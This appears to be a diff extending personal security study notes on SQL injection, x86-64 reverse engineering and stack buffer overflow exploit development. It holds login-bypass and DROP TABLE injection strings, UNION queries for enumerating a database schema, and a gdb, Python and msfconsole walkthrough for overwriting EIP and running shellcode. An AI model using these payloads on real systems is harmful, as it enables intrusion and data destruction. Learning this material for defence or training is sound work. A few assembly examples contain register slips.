@@ -155,51 +155,51 @@ Standard SQL Commands:
 Links:
         - Syntax: https://www.w3schools.com/SQL/sql_syntax.asp
         - Tutorials: https://sqlbolt.com/
-SQL Injection considerations:
+- SQL Injection considerations:
         - Requires Valid SQL Queries
         - Fully patched systems CAN BE vulnerable due to misconfiguration
         - Input Field Sanitization
         - String vs Integer values
         - Is INFORMATION_SCHEMA database available? (contains all the tables, column names, etc. - very useful)
         - GET request vs POST request HTTP methods
-Unsanitized vs Sanitized Fields:
+- Unsanitized vs Sanitized Fields:
         - Unsanitized: input fields can be found using a Single Quote ⇒ '
                 - Will return extraneous information
                 - ' closes a variable, to allow for additional statements/clauses
                 - May show no errors or generic error (harder Injection)
         - Sanitized: input fields are checked for items that might harm the database (Items are removed, escaped, or turned into a single string)
         - Validation: checks inputs to ensure it meets a criteria (String doesn’t contain ')
-Server-Side Query Processing
+- Server-Side Query Processing
         - Say that user enters JohnDoe243 in the name form field and pass1234 in the pass form field...
         - The Server-Side Query that would be passed to MySQL from PHP would be:
                 - Before input: SELECT id FROM users WHERE name=‘$name’ AND pass=‘$pass’;
                 - After input: SELECT id FROM users WHERE name=‘JohnDoe243’ AND pass=‘pass1234’;
-Statement Injection Example: (BYPASSING CREDENTIALS - POST)
+- Statement Injection Example: (BYPASSING CREDENTIALS - POST)
         - Say that user enters: tom' OR 1='1 (in the name and pass fields)
                 - Truth Statement: tom' OR 1='1
         - Server-Side query executed would appear like this:
                 - SELECT id FROM users WHERE name=‘tom' OR 1='1’ AND pass=‘tom' OR 1='1’
-Statement Injection (GET):
+- Statement Injection (GET):
         - Type in the POST statement injection into the fields but do not submit
         - Inspect page (F12), go to Network tab
         - Submit form, grab the info on the POST request, click on Request tab on the right, click on Raw option
                 - add "?" to the end of the url, then copy-paste the result after that ?
         - This should get you the array of valid SQL queries
-Stacking Statements:
+- Stacking Statements:
         - You can add in whatever statements you want by utilizing a semi-colon ;
         - User input: Johnny'; DROP TABLE Customers; --
         - Server side: SELECT * FROM user WHERE id=‘Johnny'; DROP TABLE Customers; --’
-Nesting Statements:
+- Nesting Statements:
         - Some Web Application + SQL Database combinations do not allow stacking, such as PHP and MySQL.
         - Though they may allow for nesting a statement within an existing one:
         - Key User Input: UNION SELECT 1,column_name,3 from information_schema.columns where table_name = 'members'
         - URL: php?key=<value> UNION SELECT 1,column_name,3 from information_schema.columns where table_name = 'members'
-Messing with SQL
+- Messing with SQL
         - Using # or -- tells the Database to ignore everything after
         - User input: 1 or 1=1; #
         - Server Side: SELECT product FROM item WHERE id = 1 or 1=1; # limit 1;
                 - Now you have unlimited tries!
-Blind Injection:
+- Blind Injection:
         - Includes Statements to determine how DB is configured. Essential questions:
                 - Columns in output?
                 - Can we return errors?
@@ -208,21 +208,154 @@ Blind Injection:
         - Normal Query to pull expected output: php?item=4
         - Blind injection for validation: php?item=4 OR 1=1
         - Try ALL combinations! item=1, item=2, item=3, etc.
-Abusing the Client! (GET)
+- Abusing the Client! (GET)
         - Pass the injection through the URL: After the .php?item=4 pass your UNION statement
         - Key User Input: UNION SELECT 1,2,@@version
         - URL: prices.php?item=4 UNION SELECT 1,2,@@version
                 - the @@version just queries for the SQL version
-Abusing the Client! (enum)
+- Abusing the Client! (enum)
         - Identifying the schema leads to detailed queries to enumerate the DB
                 - Research Database Schemas and what information they provide 
         - Key User Input: UNION SELECT 1,table_name,3 from information_schema.tables where table_schema=database()
         - URL: php?item=4 UNION SELECT 1,table_name,3 from information_schema.tables where table_schema=database()
-Defend!
+- Defend!
         - Validate inputs!! Methods differ by software
         - CONCATENATE: turns inputs into single strings or escape characters (messes with the injection process a little)
                 - PHP: mysql_real_escape_string
                 - SQL: sqlite3_prepare()
+
+
+
+Section 6: Reverse Engineering
+- X86_64 Assembly
+        - There are 16 general purpose 64-Bit registers
+        - %rax - the first return register
+        - %rbp - the base pointer that keeps track of the base of the stack
+        - %rsp - the stack pointer that points to the top of the stack
+        - You will see arguments passed to functions as something like: [%ebp-0x8]
+- X86_64 Assembly Common Terms:
+        - Heap - Memory that can be allocated and deallocated
+        - Stack - A contiguous section of memory used for passing arguments
+        - General Register - A multipurpose register that can be used by either programmer or user to store data or a memory location address
+        - Control Register - A processor register that changes or controls the behavior of a CPU
+        - Flags Register - Contains the current state of the processor
+- X86_64 Registers:
+        - RIP (64b) / EIP (lower 32 bits) / IP (lower 16 bits): Instruction Pointer; holds address for next instruction to be executed (memory offset of the next instruction in the code segment)
+- Common Instruction Pointers:
+        - MOV: move source to destination
+                - works in reverse
+                - "mov r15,#" means move the number into register 15
+                - "mov m,rax" means move the value in rax to m
+        - PUSH: push source onto stack
+                - "push r15" means push whatever value is in register 15 to top of the stack (increments stack pointer by 64 bits)
+        - POP: pop top of stack to destination
+                - "pop r8" means pop the value at the top of the stack into r8 (decrements stack pointer by 64 bits)
+        - INC: Increment source by 1
+                - "inc r8" means if r8 = 5, r8 now equals 6.
+        - DEC: Decrement source by 1
+                - "dec r8 means if r8 = 5, r8 now equals 4.
+        - ADD: Add source to destination
+                - "add r13,64" means if r8 = 5, r8 now equals 69.
+        - SUB: Subtract source from destination
+                - "sub r13,3" means if r8 = 5, r8 now equals 2.
+        - CMP: Compare 2 values by subtracting them and setting the %RFLAGS register. ZeroFlag set means they are the same.
+                - "cmp r8,r9" means compare the value of r8 to r9, the zero flag will be set if they are the same and not set if they are different.
+        - JMP: Jump to specified location
+                - "jmp MEM1" means jump to MEM1
+        - JLE: Jump if less than or equal
+                - "jle MEM1" means jump to MEM1 if zero flag is set less than or set to equal
+        - JE: Jump if equal
+                - "je MEM1" means jump to MEM1 if zero flag is set to equal
+        - RET: Return out of code
+                - generally, rax is set to 0 before exiting code ("exit code 0" = success)
+REVERSE ENGINEERING
+- Reverse Engineering Workflow (Software)
+        - Static: take the program, look at the code
+        - Behavioral: put in a sandbox, see what happens
+        - Dynamic: put in a debugger
+        - Disassembly: put it in a disassembler program to step through assembly on your own
+        - Document all findings!!
+- Dynamic reverse engineering flow:
+        - Perform debugging and/or disassembly
+        - Find the success/failure message, then work backwards from there
+        - Adjust instructions to get that success message
+        - Apply path and save
+        - Execute patched binary
+- NOTE: strings command is very useful for finding all human-readable text within a exe or other wacky file
+
+
+
+Section 7: Exploit Development
+- Buffer Overflow common terms:
+        - Heap: Memory that can be allocated and deallocated
+        - Stack: A contiguous section of memory used for passing arguments
+        - Registers: Storage elements as close as possible to the central processing unit (CPU)
+        - Instruction Pointer (IP): a.k.a Program Counter (PC), contains the address of next instruction to be executed
+        - Stack Pointer (SP): Contains the address of the next available space on the stack
+        - Base Pointer (BP): The base of the stack
+        - Function: Code that is separate from the main program that is often used to replace code the repeats in order to make the program smaller and more efficient
+        - Shellcode: The code that is executed once an exploit successfully takes advantage of a vulnerability
+- Buffer Overflow Defenses:
+        - Non executable (NX) stack
+        - Address Space Layout Randomization (ASLR): makes it harder to predict where the IP will point to next
+        - Data Execution Prevention (DEP)
+        - Stack Canaries: identify patterns indicating someone is tryin to overflow your stack
+        - Position Independent Executable (PIE)
+- Technical help: tools such as IDA, GHIDRA, GDB, MONA, IMMUNITY, BASH, PYTHON
+- GDB Uses:
+        - Installation of Peda Plugin:
+                git clone https://github.com/longld/peda.git ~/peda
+                echo "source ~/peda/peda.py" >> ~/.gdbinit
+        - Common Commands:
+                disass <FUNCTION>   #   Disassemble portion of the program
+                info <...>  #   Supply info for specific stack areas
+                x/256c $<REGISTER>  #   Read characters from specific register
+                break <address>  #   Establish a break point
+        - run "gdb [file]"
+        - Note: gdb [file] (may have to chmod first) is great for running a program in isolation
+                - within gdb, do
+                - run
+                - disass main (disassemble main function - call commands are interesting)
+                - disass getuserinput
+                - run <<< $(python howdy.py) (to run with a file as input instead of standard input)
+        - If you input a shitton of characters and it breaks the system, you can look at the registers to see exactly what characters ended up in which registers - this will let you execute
+          a stack overflow!
+                - If you see "sub   esp,0x44" that means the buffer overflow is a little under 68
+                - Jump ESP tells the computer to execute the top of the stack
+                - (on terminal) env - gdb [func] (sets gdb into environental variable version)
+                        - show env (removes variables to set a consistent memory location - fuck your presets! no unknown factors!)
+                                - unset env LINES
+                                - unset env COLUMNS
+                - crash the program: run > slkdfjskjdfsjkdhfksjhdfjksdhfjkshdjkfhsdjkfhsjkdfhsjkhdfjkshdfjksdhfjkhsdfjksd (receive segmentation fault)
+                        - info proc map (see memory locations of all running processes)
+                - search for jump esp command: find /b 0x[first address within the heap], 0x[end of the stack], 0xff, 0xe4
+                        - any one of the results will contain the desired command, and should do the trick (must be done in env mode)
+                        - might not work the first time, just exit gdb and try again
+                - in python:
+                        - stack goes last in, first out - if you want 0xf7de3b59, you need to put in "\x59\x3b\xde\xf7
+                        buffer = "A" * 62
+                        #eip = "BBBB"
+                        eip = "\x59\x3b\xde\xf7"
+                        #0xf7de3b59 "\x59\x3b\xde\xf7"
+                        #0xf7f588ab "\xab\x88\xf5\xf7"
+                        #0xf7f645fb "\xfb\x45\xf6\xf7"
+                        nop = "\x90" * 5
+                        print(buffer + eip + nop)
+                - because we're in the environment version, we don't know what the EIP, ESP, etc. are
+                - gdb func
+                        - run <<< $(python howdy.py)
+                - msfconsole (NOT box-specific - you can do this part on any box with metasploit, the key part here is that the shell code is generated based on the command set)
+                        - use payload/linux/x86/exec
+                        - set CMD whoami
+                        - generate -b "\x00" -f python
+                        - show options (optional - double check)
+                - take the "buf = += b"xlsdjfksd" bullshit from msfcosnole and paste the whole thing into the python program below nop as is. change print statement to (buffer + eip + nop + buf)
+                        - may need to redo this up to a dozen times - not all generated buf shellcode will work
+                - go back into normal gdb mode (exit env mode)
+                - run <<< $(python howdy.py)
+                        - note that the program (whoami) will run with whatever permissions of whatever user is running the python program?/gdb program?)
+
+
 
 
 
